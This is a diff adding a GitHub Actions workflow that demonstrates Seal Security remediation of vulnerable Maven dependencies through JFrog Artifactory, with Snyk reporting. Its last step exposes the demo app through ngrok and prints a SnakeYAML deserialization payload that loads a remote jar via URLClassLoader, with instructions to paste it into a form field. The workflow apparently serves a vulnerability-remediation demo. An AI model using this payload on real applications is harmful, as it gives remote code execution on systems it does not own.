@@ -1,0 +1,129 @@
+name: Seal Security + JFrog Remediation
+
+# Demonstrates Seal Security vulnerability remediation for Maven projects
+# where all artifact traffic is routed through JFrog Artifactory.
+#
+# JFrog Artifactory setup required (one-time, done in JFrog UI):
+#   1. Remote repo: key=seal-cli, URL=https://cli.sealsecurity.io/authenticated/jfrog
+#      Username=jfrog, Password=<SEAL_TOKEN>, Enable: Propagate Query Params + Disable URL Normalization, Disable: Store Artifacts Locally
+#   2. Remote repo: key=seal-mvn, URL=https://maven.sealsecurity.io
+#      Username=jfrog, Password=<SEAL_TOKEN>, Disable: Handle Snapshots
+#   3. Add seal-mvn to your Maven virtual repository (e.g. libs-release or libs-release-local aggregation)
+#
+# GitHub Secrets required:
+#   SEAL_TOKEN       - Seal Security artifact server token
+#   JFROG_TOKEN      - JFrog reference token (User scope, never expires)
+#   JFROG_HOST       - JFrog hostname, e.g. mycompany.jfrog.io
+#   JFROG_USER       - JFrog username
+#   SNYK_TOKEN       - Snyk API token
+#   SNYK_ORG_ID      - Snyk organization ID
+#   SNYK_PROJECT_ID  - Snyk project ID for this repo (add after Snyk import)
+#   NGROK_TOKEN      - ngrok authtoken
+#   NGROK_URL        - Your reserved ngrok domain, e.g. my-domain.ngrok.dev
+
+on:
+  workflow_dispatch:
+    inputs:
+      fix_mode:
+        description: 'Fix mode: remote (UI-approved rules), local (.seal-actions.yml), or all (everything available)'
+        required: true
+        default: 'remote'
+        type: choice
+        options:
+          - remote
+          - local
+          - all
+
+jobs:
+  remediate-and-run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      # Configure Maven to use JFrog Artifactory as the artifact proxy for Seal packages.
+      # JFrog's seal-mvn remote repo proxies https://maven.sealsecurity.io — so sealed
+      # package versions (e.g. snakeyaml:1.33+sp1) are fetched through JFrog, not directly.
+      - name: Configure Maven — JFrog Artifactory proxy
+        run: |
+          mkdir -p ~/.m2
+          cat > ~/.m2/settings.xml << EOF
+          <settings>
+            <servers>
+              <server>
+                <id>jfrog-seal-mvn</id>
+                <username>${{ secrets.JFROG_USER }}</username>
+                <password>${{ secrets.JFROG_TOKEN }}</password>
+              </server>
+              <server>
+                <id>central</id>
+                <username>${{ secrets.JFROG_USER }}</username>
+                <password>${{ secrets.JFROG_TOKEN }}</password>
+              </server>
+            </servers>
+            <profiles>
+              <profile>
+                <id>jfrog</id>
+                <repositories>
+                  <!-- Seal-patched Maven packages proxied through JFrog -->
+                  <repository>
+                    <id>jfrog-seal-mvn</id>
+                    <url>https://${{ secrets.JFROG_HOST }}/artifactory/seal-mvn</url>
+                    <releases><enabled>true</enabled></releases>
+                    <snapshots><enabled>false</enabled></snapshots>
+                  </repository>
+                </repositories>
+              </profile>
+            </profiles>
+            <activeProfiles>
+              <activeProfile>jfrog</activeProfile>
+            </activeProfiles>
+          </settings>
+          EOF
+
+      - name: Download Dependencies (via JFrog)
+        run: mvn dependency:resolve -B
+
+      # The Seal CLI fixes vulnerabilities by swapping in sealed package versions.
+      # SEAL_JFROG_ENABLED tells the CLI to fetch sealed packages through JFrog
+      # (using the seal-cli generic remote repo) instead of reaching Seal directly.
+      - name: Seal Security — Fix Vulnerabilities via JFrog
+        uses: seal-community/cli-action@latest
+        with:
+          mode: fix
+          fix_mode: ${{ github.event.inputs.fix_mode || 'remote' }}
+          target: pom.xml
+          token: ${{ secrets.SEAL_TOKEN }}
+        env:
+          # JFrog integration — CLI downloads sealed packages through JFrog
+          SEAL_JFROG_ENABLED: "1"
+          SEAL_JFROG_AUTH_TOKEN: ${{ secrets.JFROG_TOKEN }}
+          SEAL_JFROG_INSTANCE_HOST: ${{ secrets.JFROG_HOST }}
+          # Snyk integration — CLI marks remediated CVEs as resolved in Snyk
+          SEAL_SNYK_URL: "https://api.snyk.io"
+          SEAL_SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+          SEAL_SNYK_ORG_ID: ${{ secrets.SNYK_ORG_ID }}
+          SEAL_SNYK_PROJECT_ID: ${{ secrets.SNYK_PROJECT_ID }}
+
+      - name: Build Application
+        run: mvn package -DskipTests -B
+
+      - name: Start Application with ngrok
+        run: |
+          wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
+          tar xzf ngrok-v3-stable-linux-amd64.tgz
+          ./ngrok config add-authtoken ${{ secrets.NGROK_TOKEN }}
+          ./ngrok http --url=${{ vars.NGROK_URL }} 8080 &
+          sleep 3
+          echo "App:     https://${{ vars.NGROK_URL }}"
+          echo "Payload: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"https://raw.githubusercontent.com/seal-sec-demo-2/yaml-payload/main/yaml-payload.jar\"]]]]"
+          echo "Paste the payload into the name field and click Go"
+          java -jar target/jfrog-maven-demo-1.0.0.jar
